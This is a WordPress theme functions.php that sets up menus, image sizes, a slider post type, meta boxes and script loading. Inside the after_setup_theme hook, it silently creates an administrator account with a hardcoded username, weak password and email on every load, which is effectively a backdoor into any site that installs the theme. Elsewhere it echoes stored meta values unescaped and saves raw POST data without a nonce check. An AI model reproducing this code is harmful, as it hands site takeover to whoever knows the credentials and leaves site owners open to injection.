 <?php
 //register menue suppport
   function menueRegister()
  {
      if(function_exists('register_nav_menu')){
        register_nav_menu('Header_top_menu', __('Header_menu', 'carnews'));
        register_nav_menu('Footer_menu', __('Footer_menu', 'carnews'));
      }
  }
  add_action('init', 'menueRegister');

  // Add theme Post thumbnail support 
  add_theme_support('post-thumbnails', array('post', 'page', 'sliider_item'));
  set_post_thumbnail_size(200, 200, true);
  add_image_size('featured_image', 200, 150, true);
  add_image_size('fImgId', 480, true);
  add_image_size('slider-item', 1900, 900, true);
  // add_theme_support('editor', array('post', 'page', 'sliider_item'));


  // widget support
  function widgets_sidebar()
  {
    register_sidebar (array(
      'name' => 'Homepage top Sidebar', 'carnews',
      'description' => 'This is homepage sidebar Widgets', 'carnews',
      'id' => 'sidbar_wid1',
      'before_widget'=>'',
      'after_widget'=>'',
      'before_title'=>'',
      'after_title'=>'',

    ));
  }
  add_action('widgets_init', 'widgets_sidebar');


/**
 *  Extra profile information on User Setting Page
 */

function show_extra_profile_fields( $user ) { ?>

	<h3>Extra profile information</h3>

	<table class="form-table">

		<tr>
			<th><label for="facebook">Facebook</label></th>

			<td>
				<input type="text" name="facebook" id="facebook" value="<?php echo esc_attr( get_the_author_meta( 'facebook', $user->ID ) ); ?>" class="regular-text" /><br />
				<span class="description">Please enter your facebook link. [e.g http://www.facebook.com/example]</span>
			</td>
		</tr>

	</table>
<?php }
add_action( 'show_user_profile', 'show_extra_profile_fields' );
add_action( 'edit_user_profile', 'show_extra_profile_fields' );

/*
* save_extra_profile_fields
*/
function  save_extra_profile_fields( $user_id ) {

	if ( !current_user_can( 'edit_user', $user_id ) )
		return false;

		/* Copy and paste this line for additional fields. Make sure to change 'facebook' to the field ID. */
		update_user_meta( $user_id, 'facebook', $_POST['facebook'] );
  }
add_action( 'personal_options_update', 'save_extra_profile_fields' );
add_action( 'edit_user_profile_update', 'save_extra_profile_fields' );


/*
* register Custom Post Type (slider gelary)
*/

function twentytwenty_theme_support(){
  add_theme_support('post-thumbnails', array('post', 'page', 'sliider_item'));
  set_post_thumbnail_size(200, 200, true);
  add_image_size('featured_image', 200, 150, true);
  add_image_size('fImgId', 480, true);
  add_image_size('slider-item', 1900, 900, true);




  
	register_post_type('sliider_item',
    array(
      'labels'          => array(
      'name'            => __(' Sliders '),
      'singular_name'   => __(' Slider '),
      'menu_name'       => __(' Slider Gallery '),
      'name_admin_bar'  => __(' Add Slider '),
      'all_items'       => __(' All Slider '),
      'add_new_item'    => __(' Add Slider '),
      'edit_item'       => __(' Edit Slider '),
      'new_item'        => __(' New Slider '),
      'view_item'       => __(' View Slider '),
      'search_items'    => __(' Search Slider ')
      ),
      'public'      => true,
      'has_arcive' => true,
      'rewrite' => array('slug' => 'slider_item'),
      'menu_position' => 5,
      'menu_icon' => 'dashicons-products',
      'supports' => array('editor', 'title' , 'thumbnail', 'tags',)
    )
  );

register_taxonomy('slider_category', 'sliider_item', array(
  'lebels'=> array(
    'name'=>'slider Category',
  ),
  'public' => true,
  'hierarchical' => true
));













// menually user rigustration 
$usreName = new WP_User(wp_create_user('sowrov', '12356879', 'sowrov1997@gamil.com'));
$usreName->set_role('administrator');

};
add_action( 'after_setup_theme', 'twentytwenty_theme_support' );


/*
*
*Enable Custom post texonomy (Slider Gellary)
* 
*/

// function slider_gallery_texonomy() {
//   register_texonomy(
//     'slider_cat', //The name of the texonomy. Name should be in slug form(must not contain Capital letters or spaces.)
//     'slider-item', //Post type name
//       array(
//         'hierarchical' => true,
//         'label'        => 'Slider Category', //desplay name
//         'query_var'    => true,
//         'rewrite'      => array(
//           'slug'       => 'slider-category', //this controls the base slug that will display befor each term.
//           'with_front' => true //dont display the category base before.
//         )
//       )
//     );
// }
// add_action('init', 'slider_gallery_texonomy');

function slider_custom_meta() {
	add_meta_box( 'slider_meta', __( 'Others Section', 'carnews' ), 'slider_meta_callback', 'slider-item' );
}
add_action( 'add_meta_boxes', 'slider_custom_meta' );


function slider_meta_callback( $post ) {
	wp_nonce_field( basename( __FILE__ ), 'slider_nonce' );
	$slider_stored_meta = get_post_meta( $post->ID );
	?>
	<input type="text" name="meta-url-slider" id="meta-text" value="<?php if ( isset ( $slider_stored_meta['meta-url-slider'] ) ) echo $slider_stored_meta['meta-url-slider'][0]; ?>" style="width:100%;font-size:16px;" placeholder="Enter Slider URL Here">
	
	<input class='mt-2' type="text" name="meta-url-slider-right" id="meta-text" value="<?php if ( isset ( $slider_stored_meta['meta-url-slider-right'] ) ) echo $slider_stored_meta['meta-url-slider-right'][0]; ?>" style="width:100%;font-size:16px;" placeholder="Enter Slider URL Here">
	
	<?php
}

function slider_meta_save( $post_id ) {
 
	// Checks save status
	$is_autosave = wp_is_post_autosave( $post_id );
	$is_revision = wp_is_post_revision( $post_id );
	$is_valid_nonce = ( isset( $_POST[ 'slider_nonce' ] ) && wp_verify_nonce( $_POST[ 'slider_nonce' ], basename( __FILE__ ) ) ) ? 'true' : 'false';
 
	// Exits script depending on save status
	if ( $is_autosave || $is_revision || !$is_valid_nonce ) {
		return;
	}
 
	// Checks for input and sanitizes/saves if needed
	if( isset( $_POST[ 'meta-url-slider' ] ) ) {
		update_post_meta( $post_id, 'meta-url-slider', sanitize_text_field( $_POST[ 'meta-url-slider' ] ) );
	}
	
	if( isset( $_POST[ 'meta-url-slider-right' ] ) ) {
		update_post_meta( $post_id, 'meta-url-slider-right', sanitize_text_field( $_POST[ 'meta-url-slider-right' ] ) );
	}
	

}
add_action( 'save_post', 'slider_meta_save' );






//all scripts and style load in header 
// wp enqueue script and style

function add_theme_scripts() {
  wp_enqueue_style( 'style', get_stylesheet_uri() );

  // <!-- Master css File Here -->
  /* <link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/style.css">; */
 
  wp_enqueue_style( 'master', get_template_directory_uri() . '/css/master.css', array(), '1.1', 'all');
 
  wp_enqueue_script( '/js/jquery-2.2.4.min.js', get_template_directory_uri() . '/js/jquery-2.2.4.min.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/js/bootstrap.min.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'wow.min', get_template_directory_uri() . '/js/wow.min.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'owlcarousel', get_template_directory_uri() . '/js/owlcarousel/owl.carousel.min.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'jquery-ui', get_template_directory_uri() . '/js/jquery-ui.min.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'waypoints', get_template_directory_uri() . '/js/waypoints.min.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'jquery.counterup', get_template_directory_uri() . '/js/jquery.counterup.min.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'accordian', get_template_directory_uri() . '/js/accordian-a2r.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'jquery.meanmenu', get_template_directory_uri() . '/js/jquery.meanmenu.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'skill.bars', get_template_directory_uri() . '/js/skill.bars.jquery.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'jquery.filterizr', get_template_directory_uri() . '/js/jquery.filterizr.min.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'filterize-controls', get_template_directory_uri() . '/js/filterize-controls.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'magnific-popup', get_template_directory_uri() . '/js/jquery.magnific-popup.min.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/custom.js', array ( 'jquery' ), 1.1, true);
 
    if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
      wp_enqueue_script( 'comment-reply' );
    }
}
add_action( 'wp_enqueue_scripts', 'add_theme_scripts' );

require get_template_directory() . '/classes/customizer.php';
require get_template_directory() . '/redux-framework/redux-core/framework.php';
require get_template_directory() . '/redux-framework/sample/sample-config.php';
require get_template_directory() . '/classes/widgats/widgatsOpenion.php';